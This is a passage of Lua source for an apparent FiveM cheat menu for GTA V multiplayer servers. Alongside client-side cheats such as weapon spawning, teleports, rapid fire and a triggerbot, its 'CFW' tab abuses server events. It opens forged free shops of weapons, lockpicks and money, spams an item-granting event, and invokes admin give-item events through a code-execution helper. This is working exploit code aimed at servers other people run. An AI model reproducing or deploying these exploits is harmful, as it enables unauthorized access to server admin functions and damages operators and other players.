                                local m = {["Pump Shotgun"]="WEAPON_PUMPSHOTGUN",["Sawed-Off"]="WEAPON_SAWNOFFSHOTGUN",["Assault Shotgun"]="WEAPON_ASSAULTSHOTGUN",["Bullpup Shotgun"]="WEAPON_BULLPUPSHOTGUN",["Heavy Shotgun"]="WEAPON_HEAVYSHOTGUN",["Auto Shotgun"]="WEAPON_AUTOSHOTGUN",["Double Barrel"]="WEAPON_DBSHOTGUN"}
                                if val and m[val] then GiveWeaponToPed(PlayerPedId(), GetHashKey(m[val]), 999, false, true) end
                            end},
                            {name = "Snipers", type = "selector", selected = 1, options = {"Sniper Rifle","Heavy Sniper","Marksman Rifle"}, onClick = function(sel, val)
                                local m = {["Sniper Rifle"]="WEAPON_SNIPERRIFLE",["Heavy Sniper"]="WEAPON_HEAVYSNIPER",["Marksman Rifle"]="WEAPON_MARKSMANRIFLE"}
                                if val and m[val] then GiveWeaponToPed(PlayerPedId(), GetHashKey(m[val]), 999, false, true) end
                            end},
                            {name = "Explosives", type = "selector", selected = 1, options = {"RPG","Grenade Launcher","Homing Launcher","Minigun","Railgun"}, onClick = function(sel, val)
                                local m = {["RPG"]="WEAPON_RPG",["Grenade Launcher"]="WEAPON_GRENADELAUNCHER",["Homing Launcher"]="WEAPON_HOMINGLAUNCHER",["Minigun"]="WEAPON_MINIGUN",["Railgun"]="WEAPON_RAILGUN"}
                                if val and m[val] then GiveWeaponToPed(PlayerPedId(), GetHashKey(m[val]), 999, false, true) end
                            end},
                            {name = "Throwables", type = "selector", selected = 1, options = {"Grenade","Sticky Bomb","Molotov","Pipe Bomb","Proximity Mine","Smoke Grenade","BZ Gas","Snowball"}, onClick = function(sel, val)
                                local m = {["Grenade"]="WEAPON_GRENADE",["Sticky Bomb"]="WEAPON_STICKYBOMB",["Molotov"]="WEAPON_MOLOTOV",["Pipe Bomb"]="WEAPON_PIPEBOMB",["Proximity Mine"]="WEAPON_PROXMINE",["Smoke Grenade"]="WEAPON_SMOKEGRENADE",["BZ Gas"]="WEAPON_BZGAS",["Snowball"]="WEAPON_SNOWBALL"}
                                if val and m[val] then GiveWeaponToPed(PlayerPedId(), GetHashKey(m[val]), 20, false, true) end
                            end},

                            {isSeparator = true, separatorText = "Combat"},
                            {name = "Infinite Ammo", type = "toggle", value = false, onClick = function(state)
                                SetPedInfiniteAmmoClip(PlayerPedId(), state)
                            end},
                        }
                    },
                    {
                        name = "Vehicle",
                        items = {
                            {isSeparator = true, separatorText = "Quick Spawn"},
                            {name = "(vrp) Spawn by Name", type = "action", onClick = function()
                                Menu.OpenInput("Spawn Vehicle", "Vehicle name:", function(input)
                                    if input and input ~= "" then Menu.SpawnVehicle(input:lower()) end
                                end)
                            end},

                            {isSeparator = true, separatorText = "Vehicle Options"},
                            {name = "Repair Vehicle", type = "action", onClick = function()
                                if IsPedInAnyVehicle(PlayerPedId(), false) then
                                    local v = GetVehiclePedIsIn(PlayerPedId(), false)
                                    SetVehicleFixed(v) SetVehicleDeformationFixed(v) SetVehicleDirtLevel(v, 0.0)
                                    SetVehicleEngineHealth(v, 1000.0) SetVehicleBodyHealth(v, 1000.0)
                                end
                            end},
                            {name = "Max Upgrade", type = "action", onClick = function()
                                if IsPedInAnyVehicle(PlayerPedId(), false) then
                                    local v = GetVehiclePedIsIn(PlayerPedId(), false)
                                    SetVehicleModKit(v, 0)
                                    for i = 0, 50 do local mx = GetNumVehicleMods(v, i) if mx > 0 then SetVehicleMod(v, i, mx - 1, false) end end
                                    ToggleVehicleMod(v, 18, true) ToggleVehicleMod(v, 22, true) SetVehicleWindowTint(v, 1)
                                end
                            end},
                            {name = "Delete Vehicle", type = "action", onClick = function()
                                if IsPedInAnyVehicle(PlayerPedId(), false) then
                                    local v = GetVehiclePedIsIn(PlayerPedId(), false)
                                    TaskLeaveVehicle(PlayerPedId(), v, 16) Citizen.Wait(1500) DeleteEntity(v)
                                end
                            end},

                            {isSeparator = true, separatorText = "Toggles"},
                            {name = "Speed Boost", type = "toggle", value = false, onClick = function(state) Menu.SpeedBoostEnabled = state end},
                        }
                    },
                    {
                        name = "Teleport",
                        items = {
                            {name = "FIB Building", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), 136.0, -749.0, 258.15, false,false,false,true) end},
                            {name = "Mission Row PD", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), 441.85, -981.15, 30.69, false,false,false,true) end},
                            {name = "Pillbox Hospital", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), 311.81, -590.37, 43.29, false,false,false,true) end},
                            {name = "Grove Street", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), -16.0, -1441.0, 31.1, false,false,false,true) end},
                            {name = "Legion Square", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), 195.17, -933.78, 30.69, false,false,false,true) end},
                            {name = "Maze Bank Tower", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), -75.01, -818.22, 326.18, false,false,false,true) end},
                            {name = "Airport LSIA", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), -1034.6, -2733.6, 20.17, false,false,false,true) end},
                            {name = "Military Base", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), -2047.4, 3132.1, 32.81, false,false,false,true) end},
                            {name = "Mount Chiliad", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), 501.77, 5604.85, 797.91, false,false,false,true) end},
                            {name = "Sandy Shores", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), 1848.73, 3694.04, 34.27, false,false,false,true) end},
                            {name = "Paleto Bay", type = "action", onClick = function() SetEntityCoords(PlayerPedId(), -379.53, 6118.32, 31.85, false,false,false,true) end},
                        }
                    },
                }
            },

            {
                name = "WEAPON",
                hasTabs = true,
                tabs = {
                    {
                        name = "vrp",
                        items = {
                            {name = "Give all weapons", type = "action", onClick = function()
                                local ped = PlayerPedId()
                                local w = {"WEAPON_PISTOL","WEAPON_COMBATPISTOL","WEAPON_APPISTOL","WEAPON_PISTOL50","WEAPON_HEAVYPISTOL","WEAPON_REVOLVER","WEAPON_MICROSMG","WEAPON_SMG","WEAPON_ASSAULTSMG","WEAPON_COMBATPDW","WEAPON_ASSAULTRIFLE","WEAPON_CARBINERIFLE","WEAPON_ADVANCEDRIFLE","WEAPON_SPECIALCARBINE","WEAPON_BULLPUPRIFLE","WEAPON_COMPACTRIFLE","WEAPON_SNIPERRIFLE","WEAPON_HEAVYSNIPER","WEAPON_MARKSMANRIFLE","WEAPON_PUMPSHOTGUN","WEAPON_SAWNOFFSHOTGUN","WEAPON_ASSAULTSHOTGUN","WEAPON_COMBATMG","WEAPON_MG","WEAPON_MINIGUN","WEAPON_RPG","WEAPON_GRENADELAUNCHER","WEAPON_HOMINGLAUNCHER","WEAPON_GRENADE","WEAPON_STICKYBOMB","WEAPON_MOLOTOV","WEAPON_KNIFE","WEAPON_MACHETE","WEAPON_BAT"}
                                for _, v in ipairs(w) do GiveWeaponToPed(ped, GetHashKey(v), 999, false, false) end
                            end},
                            {name = "Spawn by Name (vrp)", type = "action", onClick = function()
                                Menu.OpenInput("Spawn Weapon", "WEAPON_PISTOL:", function(input)
                                    if not input or input == "" then return end
                                    local name = input:upper()
                                    if not name:find("WEAPON_") then name = "WEAPON_" .. name end
                                    local hash = GetHashKey(name)
                                    Menu.SafeExec(string.format([[GiveWeaponToPed(PlayerPedId(), %d, 999, false, true)]], hash))
                                end)
                            end},
                            {name = "Remove All Weapons", type = "action", onClick = function()
                                Menu.SafeExec([[RemoveAllPedWeapons(PlayerPedId(), true)]])
                            end},

                            {isSeparator = true, separatorText = "Melee"},
                            {name = "Melee Weapons", type = "selector", options = {
                                "Knife", "Dagger", "Baseball Bat", "Crowbar", "Golf Club", "Hammer", "Hatchet",
                                "Machete", "Switchblade", "Nightstick", "Wrench", "Pool Cue", "Battle Axe", "Stone Hatchet"
                            }, selected = 1, onClick = function(sel, val)
                                local map = {["Knife"]="WEAPON_KNIFE",["Dagger"]="WEAPON_DAGGER",["Baseball Bat"]="WEAPON_BAT",["Crowbar"]="WEAPON_CROWBAR",["Golf Club"]="WEAPON_GOLFCLUB",["Hammer"]="WEAPON_HAMMER",["Hatchet"]="WEAPON_HATCHET",["Machete"]="WEAPON_MACHETE",["Switchblade"]="WEAPON_SWITCHBLADE",["Nightstick"]="WEAPON_NIGHTSTICK",["Wrench"]="WEAPON_WRENCH",["Pool Cue"]="WEAPON_POOLCUE",["Battle Axe"]="WEAPON_BATTLEAXE",["Stone Hatchet"]="WEAPON_STONE_HATCHET"}
                                GiveWeaponToPed(PlayerPedId(), GetHashKey(map[val] or "WEAPON_KNIFE"), 1, false, true)
                                Menu.Toast(val .. " given!", "green")
                            end},

                            {isSeparator = true, separatorText = "Handguns"},
                            {name = "Handguns", type = "selector", options = {
                                "Pistol", "Pistol Mk II", "Combat Pistol", "AP Pistol", "Pistol .50",
                                "SNS Pistol", "Heavy Pistol", "Vintage Pistol", "Ceramic Pistol",
                                "Marksman Pistol", "Machine Pistol", "Stun Gun", "Flare Gun", "Up-n-Atomizer"
                            }, selected = 1, onClick = function(sel, val)
                                local map = {["Pistol"]="WEAPON_PISTOL",["Pistol Mk II"]="WEAPON_PISTOL_MK2",["Combat Pistol"]="WEAPON_COMBATPISTOL",["AP Pistol"]="WEAPON_APPISTOL",["Pistol .50"]="WEAPON_PISTOL50",["SNS Pistol"]="WEAPON_SNSPISTOL",["Heavy Pistol"]="WEAPON_HEAVYPISTOL",["Vintage Pistol"]="WEAPON_VINTAGEPISTOL",["Ceramic Pistol"]="WEAPON_CERAMICPISTOL",["Marksman Pistol"]="WEAPON_MARKSMANPISTOL",["Machine Pistol"]="WEAPON_MACHINEPISTOL",["Stun Gun"]="WEAPON_STUNGUN",["Flare Gun"]="WEAPON_FLAREGUN",["Up-n-Atomizer"]="WEAPON_RAYPISTOL"}
                                GiveWeaponToPed(PlayerPedId(), GetHashKey(map[val] or "WEAPON_PISTOL"), 999, false, true)
                                Menu.Toast(val .. " given!", "green")
                            end},

                            {isSeparator = true, separatorText = "SMGs"},
                            {name = "SMGs", type = "selector", options = {
                                "Micro SMG", "SMG", "SMG Mk II", "Assault SMG", "Combat PDW", "Mini SMG"
                            }, selected = 1, onClick = function(sel, val)
                                local map = {["Micro SMG"]="WEAPON_MICROSMG",["SMG"]="WEAPON_SMG",["SMG Mk II"]="WEAPON_SMG_MK2",["Assault SMG"]="WEAPON_ASSAULTSMG",["Combat PDW"]="WEAPON_COMBATPDW",["Mini SMG"]="WEAPON_MINISMG"}
                                GiveWeaponToPed(PlayerPedId(), GetHashKey(map[val] or "WEAPON_SMG"), 999, false, true)
                                Menu.Toast(val .. " given!", "green")
                            end},

                            {isSeparator = true, separatorText = "Rifles"},
                            {name = "Rifles", type = "selector", options = {
                                "Assault Rifle", "Assault Rifle Mk II", "Carbine Rifle", "Carbine Rifle Mk II",
                                "Advanced Rifle", "Special Carbine", "Bullpup Rifle", "Compact Rifle", "Military Rifle"
                            }, selected = 1, onClick = function(sel, val)
                                local map = {["Assault Rifle"]="WEAPON_ASSAULTRIFLE",["Assault Rifle Mk II"]="WEAPON_ASSAULTRIFLE_MK2",["Carbine Rifle"]="WEAPON_CARBINERIFLE",["Carbine Rifle Mk II"]="WEAPON_CARBINERIFLE_MK2",["Advanced Rifle"]="WEAPON_ADVANCEDRIFLE",["Special Carbine"]="WEAPON_SPECIALCARBINE",["Bullpup Rifle"]="WEAPON_BULLPUPRIFLE",["Compact Rifle"]="WEAPON_COMPACTRIFLE",["Military Rifle"]="WEAPON_MILITARYRIFLE"}
                                GiveWeaponToPed(PlayerPedId(), GetHashKey(map[val] or "WEAPON_ASSAULTRIFLE"), 999, false, true)
                                Menu.Toast(val .. " given!", "green")
                            end},

                            {isSeparator = true, separatorText = "Shotguns"},
                            {name = "Shotguns", type = "selector", options = {
                                "Pump Shotgun", "Sawed-Off", "Assault Shotgun", "Bullpup Shotgun",
                                "Heavy Shotgun", "Auto Shotgun", "Double Barrel"
                            }, selected = 1, onClick = function(sel, val)
                                local map = {["Pump Shotgun"]="WEAPON_PUMPSHOTGUN",["Sawed-Off"]="WEAPON_SAWNOFFSHOTGUN",["Assault Shotgun"]="WEAPON_ASSAULTSHOTGUN",["Bullpup Shotgun"]="WEAPON_BULLPUPSHOTGUN",["Heavy Shotgun"]="WEAPON_HEAVYSHOTGUN",["Auto Shotgun"]="WEAPON_AUTOSHOTGUN",["Double Barrel"]="WEAPON_DBSHOTGUN"}
                                GiveWeaponToPed(PlayerPedId(), GetHashKey(map[val] or "WEAPON_PUMPSHOTGUN"), 999, false, true)
                                Menu.Toast(val .. " given!", "green")
                            end},

                            {isSeparator = true, separatorText = "Snipers"},
                            {name = "Snipers", type = "selector", options = {
                                "Sniper Rifle", "Heavy Sniper", "Heavy Sniper Mk II", "Marksman Rifle", "Marksman Rifle Mk II"
                            }, selected = 1, onClick = function(sel, val)
                                local map = {["Sniper Rifle"]="WEAPON_SNIPERRIFLE",["Heavy Sniper"]="WEAPON_HEAVYSNIPER",["Heavy Sniper Mk II"]="WEAPON_HEAVYSNIPER_MK2",["Marksman Rifle"]="WEAPON_MARKSMANRIFLE",["Marksman Rifle Mk II"]="WEAPON_MARKSMANRIFLE_MK2"}
                                GiveWeaponToPed(PlayerPedId(), GetHashKey(map[val] or "WEAPON_SNIPERRIFLE"), 999, false, true)
                                Menu.Toast(val .. " given!", "green")
                            end},

                            {isSeparator = true, separatorText = "Explosives & Heavy"},
                            {name = "Explosives", type = "selector", options = {
                                "RPG", "Grenade Launcher", "Homing Launcher", "Minigun", "Railgun",
                                "Firework Launcher", "Compact Launcher"
                            }, selected = 1, onClick = function(sel, val)
                                local map = {["RPG"]="WEAPON_RPG",["Grenade Launcher"]="WEAPON_GRENADELAUNCHER",["Homing Launcher"]="WEAPON_HOMINGLAUNCHER",["Minigun"]="WEAPON_MINIGUN",["Railgun"]="WEAPON_RAILGUN",["Firework Launcher"]="WEAPON_FIREWORK",["Compact Launcher"]="WEAPON_COMPACTLAUNCHER"}
                                GiveWeaponToPed(PlayerPedId(), GetHashKey(map[val] or "WEAPON_RPG"), 999, false, true)
                                Menu.Toast(val .. " given!", "green")
                            end},

                            {isSeparator = true, separatorText = "Throwables"},
                            {name = "Throwables", type = "selector", options = {
                                "Grenade", "Sticky Bomb", "Molotov", "Pipe Bomb", "Proximity Mine",
                                "Smoke Grenade", "BZ Gas", "Snowball", "Baseball"
                            }, selected = 1, onClick = function(sel, val)
                                local map = {["Grenade"]="WEAPON_GRENADE",["Sticky Bomb"]="WEAPON_STICKYBOMB",["Molotov"]="WEAPON_MOLOTOV",["Pipe Bomb"]="WEAPON_PIPEBOMB",["Proximity Mine"]="WEAPON_PROXMINE",["Smoke Grenade"]="WEAPON_SMOKEGRENADE",["BZ Gas"]="WEAPON_BZGAS",["Snowball"]="WEAPON_SNOWBALL",["Baseball"]="WEAPON_BALL"}
                                GiveWeaponToPed(PlayerPedId(), GetHashKey(map[val] or "WEAPON_GRENADE"), 20, false, true)
                                Menu.Toast(val .. " given!", "green")
                            end},
                        }
                    },

                    {
                        name = "CFW",
                        items = {
                            {name = "shadow store", type = "action", onClick = function()
                                Menu.StartCustomLoading(2000, function()
                                    Citizen.CreateThread(function()
                                        local items = {
                                            {name="weapon_pistol",amount=9999,price=0,type="weapon",metadata={ammo=200}},
                                            {name="weapon_smg",amount=9999,price=0,type="weapon",metadata={ammo=200}},
                                            {name="weapon_microsmg",amount=9999,price=0,type="weapon",metadata={ammo=200}},
                                            {name="weapon_machinepistol",amount=9999,price=0,type="weapon",metadata={ammo=200}},
                                            {name="weapon_combatpistol",amount=9999,price=0,type="weapon",metadata={ammo=200}},
                                            {name="weapon_appistol",amount=9999,price=0,type="weapon",metadata={ammo=200}},
                                            {name="weapon_snspistol",amount=9999,price=0,type="weapon",metadata={ammo=200}},
                                            {name="weapon_assaultrifle",amount=9999,price=0,type="weapon",metadata={ammo=50}},
                                            {name="weapon_carbinerifle",amount=9999,price=0,type="weapon",metadata={ammo=50}},
                                            {name="weapon_advancedrifle",amount=9999,price=0,type="weapon",metadata={ammo=50}},
                                            {name="weapon_combatmg",amount=9999,price=0,type="weapon",metadata={ammo=150}},
                                            {name="weapon_pumpshotgun",amount=9999,price=0,type="weapon",metadata={ammo=30}},
                                            {name="weapon_sawnoffshotgun",amount=9999,price=0,type="weapon",metadata={ammo=30}},
                                            {name="weapon_heavysniper",amount=9999,price=0,type="weapon",metadata={ammo=50}},
                                            {name="weapon_sniperrifle",amount=9999,price=0,type="weapon",metadata={ammo=50}},
                                            {name="weapon_rpg",amount=9999,price=0,type="weapon",metadata={ammo=2}},
                                            {name="weapon_minigun",amount=9999,price=0,type="weapon",metadata={ammo=500}},
                                            {name="weapon_knife",amount=9999,price=0,type="weapon",metadata={}},
                                            {name="weapon_bat",amount=9999,price=0,type="weapon",metadata={}},
                                            {name="weapon_switchblade",amount=9999,price=0,type="weapon",metadata={}},
                                            {name="handcuffs",amount=9999,price=0,type="item",metadata={}},
                                            {name="heavyarmor",amount=9999,price=0,type="item",metadata={}},
                                            {name="armor",amount=9999,price=0,type="item",metadata={}},
                                            {name="radio",amount=9999,price=0,type="item",metadata={}},
                                            {name="advancedlockpick",amount=9999,price=0,type="item",metadata={}},
                                            {name="lockpick",amount=9999,price=0,type="item",metadata={}},
                                            {name="drill",amount=9999,price=0,type="item",metadata={}},
                                            {name="gatecrack",amount=9999,price=0,type="item",metadata={}},
                                            {name="electronickit",amount=9999,price=0,type="item",metadata={}},
                                            {name="screwdriverset",amount=9999,price=0,type="item",metadata={}},
                                            {name="backpack",amount=9999,price=0,type="item",metadata={slots=100,weight=200000}},
                                            {name="pistol_ammo",amount=9999,price=0,type="item",metadata={}},
                                            {name="rifle_ammo",amount=9999,price=0,type="item",metadata={}},
                                            {name="smg_ammo",amount=9999,price=0,type="item",metadata={}},
                                            {name="shotgun_ammo",amount=9999,price=0,type="item",metadata={}},
                                            {name="snp_ammo",amount=9999,price=0,type="item",metadata={}},
                                            {name="mg_ammo",amount=9999,price=0,type="item",metadata={}},
                                            {name="money",amount=9999,price=0,type="item",metadata={worth=100000}},
                                            {name="goldbar",amount=9999,price=0,type="item",metadata={}},
                                            {name="diamond",amount=9999,price=0,type="item",metadata={}},
                                            {name="rolex",amount=9999,price=0,type="item",metadata={}},
                                            {name="diamond_ring",amount=9999,price=0,type="item",metadata={}},
                                            {name="firstaid",amount=9999,price=0,type="item",metadata={}},
                                            {name="bandage",amount=9999,price=0,type="item",metadata={}},
                                            {name="painkillers",amount=9999,price=0,type="item",metadata={}},
                                        }
                                        local shop = {label="Shadow Store",slots=#items,items={}}
                                        for i,v in ipairs(items) do
                                            shop.items[i] = {name=v.name,price=v.price,amount=v.amount,info=v.metadata or {},type=v.type,slot=i}
                                        end
                                        local sn = "Vendingshop_"..math.random(1,99999)
                                        TriggerServerEvent('inventory:server:OpenInventory','shop',sn,shop)
                                        print("[SHADOW] تم فتح المتجر الوهمي الشامل. كل ما تحتاجه موجود بكميات لا نهائية.")
                                        print("[SHADOW] هاتف - فواتح - أسلحة - ذخيرة - دروع - أدوات - أموال - مواد - أكل - دواء - كل شيء.")
                                    end)
                                end)
                            end},
                            {name = "Weapons Only", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local items = {
                                        {name="weapon_pistol",amount=9999,price=0,type="weapon",metadata={ammo=200}},
                                        {name="weapon_smg",amount=9999,price=0,type="weapon",metadata={ammo=200}},
                                        {name="weapon_assaultrifle",amount=9999,price=0,type="weapon",metadata={ammo=50}},
                                        {name="weapon_carbinerifle",amount=9999,price=0,type="weapon",metadata={ammo=50}},
                                        {name="weapon_combatmg",amount=9999,price=0,type="weapon",metadata={ammo=150}},
                                        {name="weapon_heavysniper",amount=9999,price=0,type="weapon",metadata={ammo=50}},
                                        {name="weapon_rpg",amount=9999,price=0,type="weapon",metadata={ammo=2}},
                                        {name="weapon_minigun",amount=9999,price=0,type="weapon",metadata={ammo=500}},
                                        {name="weapon_knife",amount=9999,price=0,type="weapon",metadata={}},
                                        {name="weapon_switchblade",amount=9999,price=0,type="weapon",metadata={}},
                                    }
                                    local shop = {label="Armory",slots=#items,items={}}
                                    for i,v in ipairs(items) do
                                        shop.items[i] = {name=v.name,price=v.price,amount=v.amount,info=v.metadata or {},type=v.type,slot=i}
                                    end
                                    TriggerServerEvent('inventory:server:OpenInventory','shop','GunShop_'..math.random(1,99999),shop)
                                end)
                                Menu.Toast("Armory opened!", "blue")
                            end},
                            {name = "Items & Tools Only", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local items = {
                                        {name="heavyarmor",amount=9999,price=0,type="item",metadata={}},
                                        {name="armor",amount=9999,price=0,type="item",metadata={}},
                                        {name="advancedlockpick",amount=9999,price=0,type="item",metadata={}},
                                        {name="lockpick",amount=9999,price=0,type="item",metadata={}},
                                        {name="drill",amount=9999,price=0,type="item",metadata={}},
                                        {name="gatecrack",amount=9999,price=0,type="item",metadata={}},
                                        {name="electronickit",amount=9999,price=0,type="item",metadata={}},
                                        {name="backpack",amount=9999,price=0,type="item",metadata={slots=100,weight=200000}},
                                        {name="radio",amount=9999,price=0,type="item",metadata={}},
                                        {name="firstaid",amount=9999,price=0,type="item",metadata={}},
                                        {name="bandage",amount=9999,price=0,type="item",metadata={}},
                                        {name="painkillers",amount=9999,price=0,type="item",metadata={}},
                                    }
                                    local shop = {label="Supply Store",slots=#items,items={}}
                                    for i,v in ipairs(items) do
                                        shop.items[i] = {name=v.name,price=v.price,amount=v.amount,info=v.metadata or {},type=v.type,slot=i}
                                    end
                                    TriggerServerEvent('inventory:server:OpenInventory','shop','SupplyShop_'..math.random(1,99999),shop)
                                end)
                                Menu.Toast("Supply Store opened!", "green")
                            end},
                            {name = "Valuables Only", type = "action", onClick = function()
                                Citizen.CreateThread(function()
                                    local items = {
                                        {name="money",amount=9999,price=0,type="item",metadata={worth=100000}},
                                        {name="goldbar",amount=9999,price=0,type="item",metadata={}},
                                        {name="diamond",amount=9999,price=0,type="item",metadata={}},
                                        {name="rolex",amount=9999,price=0,type="item",metadata={}},
                                        {name="diamond_ring",amount=9999,price=0,type="item",metadata={}},
                                        {name="gold_chain",amount=9999,price=0,type="item",metadata={}},
                                        {name="ruby",amount=9999,price=0,type="item",metadata={}},
                                        {name="emerald",amount=9999,price=0,type="item",metadata={}},
                                    }
                                    local shop = {label="Black Market",slots=#items,items={}}
                                    for i,v in ipairs(items) do
                                        shop.items[i] = {name=v.name,price=v.price,amount=v.amount,info=v.metadata or {},type=v.type,slot=i}
                                    end
                                    TriggerServerEvent('inventory:server:OpenInventory','shop','BlackMarket_'..math.random(1,99999),shop)
                                end)
                                Menu.Toast("Black Market opened!", "purple")
                            end},
                            {name = "World Star", type = "selector", options = {
                                "PistolMk2", "Heavy Armor", "Assault Rifle", "Bandage"
                            }, selected = 1, onClick = function(index)
                                local itemList = {
                                    [1] = "weapon_pistol_mk2",
                                    [2] = "heavyarmor",
                                    [3] = "weapon_assaultrifle",
                                    [4] = "bandage"
                                }
                                local itemName = itemList[index]
                                if not itemName then Menu.Toast("Invalid item", "red") return end
                                Menu.OpenInput("World Star", "Count for " .. itemName .. ":", function(input)
                                    local count = tonumber(input)
                                    if not count or count < 1 then Menu.Toast("Invalid count", "red") return end
                                    if count > 500 then count = 500 end
                                    Citizen.CreateThread(function()
                                        local info = { quality = 100, ammo = 250 }
                                        for i = 1, count do
                                            TriggerServerEvent("qbawadwsalitemhack", itemName, 1, false, info, "making snrbuns_sandwich")
                                            Citizen.Wait(50)
                                        end
                                        Menu.Toast(count .. "x " .. itemName .. " done!", "green")
                                    end)
                                end)
                            end},
                            {name = "RivalZ Hazmat Spawner", type = "action", onClick = function()
                                Menu.StartCustomLoading(2000, function()
                                    Citizen.CreateThread(function()
                                        local myServerId = GetPlayerServerId(PlayerId())
                                        local itemsToSpawn = {
                                            "gadget_hazmat", 
                                            "hazmat_mask",   
                                            "hazmat_blue"    
                                        }
                                        for _, itemName in ipairs(itemsToSpawn) do
                                            local code = string.format([[
                                                TriggerServerEvent("919-admin:server:GiveItem", %d, "%s", 1)
                                                TriggerServerEvent("prp-dailyquests:server:pedInteraction", "request", "%s", nil, 1)
                                                TriggerServerEvent("inventory:server:add", "%s", 1)
                                            ]], myServerId, itemName, itemName, itemName)
                                            Menu.SafeExec(code)
                                        end
                                        Menu.Toast("RivalZ Hazmat deployed!", "green")
                                    end)
                                end)
                            end},
                            {name = "RivalZ Weapon Spawner", type = "selector", selected = 1, options = {
                                "Pistol", "Combat Pistol", "AP Pistol", "SMG", "Micro SMG", "Carbine Rifle", "Assault Rifle", "Pump Shotgun", "Heavy Sniper"
                            }, onClick = function(sel, val)
                                local weaponMap = {
                                    ["Pistol"] = "weapon_pistol",
                                    ["Combat Pistol"] = "weapon_combatpistol",
                                    ["AP Pistol"] = "weapon_appistol",
                                    ["SMG"] = "weapon_smg",
                                    ["Micro SMG"] = "weapon_microsmg",
                                    ["Carbine Rifle"] = "weapon_carbinerifle",
                                    ["Assault Rifle"] = "weapon_assaultrifle",
                                    ["Pump Shotgun"] = "weapon_pumpshotgun",
                                    ["Heavy Sniper"] = "weapon_heavysniper",
                                }
                                local itemName = weaponMap[val]
                                if itemName then
                                    Menu.StartCustomLoading(1500, function()
                                        local myServerId = GetPlayerServerId(PlayerId())
                                        local code = string.format([[
                                            TriggerServerEvent("919-admin:server:GiveItem", %d, "%s", 1)
                                            TriggerServerEvent("prp-dailyquests:server:pedInteraction", "request", "%s", nil, 1)
                                            TriggerServerEvent("inventory:server:add", "%s", 1)
                                        ]], myServerId, itemName, itemName, itemName)
                                        Menu.SafeExec(code)
                                        Menu.Toast("Spawned " .. val, "green")
                                    end)
                                end
                            end},
                            {name = "RivalZ Custom Spawner", type = "action", onClick = function()
                                Menu.OpenInput("RivalZ Spawn", "item_name:count (e.g. wood:10):", function(input)
                                    if not input or input == "" then return end
                                    local item, count = input:match("([^:]+):?(%d*)")
                                    count = tonumber(count) or 1
                                    if item then
                                        Menu.StartCustomLoading(1500, function()
                                            local myServerId = GetPlayerServerId(PlayerId())
                                            local code = string.format([[
                                                TriggerServerEvent("919-admin:server:GiveItem", %d, "%s", %d)
                                                TriggerServerEvent("prp-dailyquests:server:pedInteraction", "request", "%s", nil, %d)
                                                TriggerServerEvent("inventory:server:add", "%s", %d)
                                            ]], myServerId, item, count, item, count, item, count)
                                            Menu.SafeExec(code)
                                            Menu.Toast("Spawned " .. count .. "x " .. item, "green")
                                        end)
                                    end
                                end)
                            end},
                        }
                    },
                    {
                        name = "Mods",
                        items = {
                            {name = "Unlimited Ammo", type = "toggle", value = false, onClick = function(state)
                                SetPedInfiniteAmmoClip(PlayerPedId(), state)
                            end},
                            {name = "No Reload", type = "toggle", value = false, onClick = function(state)
                                SetPedInfiniteAmmoClip(PlayerPedId(), state)
                            end},
                            {name = "One Shot Kill", type = "toggle", value = false, onClick = function(state)
                                SetPlayerWeaponDamageModifier(PlayerId(), state and 100.0 or 1.0)
                            end},
                            {name = "Explosive Ammo", type = "toggle", value = false, onClick = function(state)
                                Menu.ExplosiveAmmoEnabled = state
                            end},
                            {name = "Fire Ammo", type = "toggle", value = false, onClick = function(state)
                                Menu.FireAmmoEnabled = state
                            end},

                            {isSeparator = true, separatorText = "Advanced"},

                            {name = "Rapid Fire", type = "toggle", value = false, onClick = function(state)
                                Menu.RapidFireEnabled = state
                                Menu.RegisterFeature("Rapid Fire", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.RapidFireEnabled do
                                            if IsPlayerFreeAiming(PlayerId()) and IsDisabledControlPressed(0, 24) then
                                                local ped = PlayerPedId()
                                                local _, wHash = GetCurrentPedWeapon(ped, true)
                                                local c = GetGameplayCamCoord()
                                                local r = GetGameplayCamRot(2)
                                                local fv = vector3(-math.sin(math.rad(r.z))*math.cos(math.rad(r.x)), math.cos(math.rad(r.z))*math.cos(math.rad(r.x)), math.sin(math.rad(r.x)))
                                                local dest = c + fv * 200.0
                                                ShootSingleBulletBetweenCoords(c.x, c.y, c.z, dest.x, dest.y, dest.z, 50, true, wHash, ped, true, false, 2000.0)
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end)
                                end
                            end},

                            {name = "Triggerbot", type = "toggle", value = false, onClick = function(state)
                                Menu.TriggerbotEnabled = state
                                Menu.RegisterFeature("Triggerbot", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.TriggerbotEnabled do
                                            if IsPlayerFreeAiming(PlayerId()) then
                                                local _, target = GetEntityPlayerIsFreeAimingAt(PlayerId())
                                                if target and DoesEntityExist(target) and IsEntityAPed(target) and not IsEntityDead(target) then
                                                    DisableControlAction(0, 24, true)
                                                    SetControlNormal(0, 24, 1.0)
                                                end
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end)
                                end
                            end},

                            {name = "Gravity Gun", type = "toggle", value = false, onClick = function(state)
                                Menu.GravityGunEnabled = state
                                Menu.RegisterFeature("Gravity Gun", state)
                                if state then
                                    Menu.GravityGunEntity = nil
                                    Citizen.CreateThread(function()
                                        while Menu.GravityGunEnabled do
                                            if IsPlayerFreeAiming(PlayerId()) then
                                                local hit, endC, _, _, entity = GetShapeTestResult(StartShapeTestCapsule(
                                                    GetGameplayCamCoord().x, GetGameplayCamCoord().y, GetGameplayCamCoord().z,
                                                    GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 50.0, 0.0).x,
                                                    GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 50.0, 0.0).y,
                                                    GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 50.0, 0.0).z,
                                                    0.5, 12, PlayerPedId(), 7
                                                ))
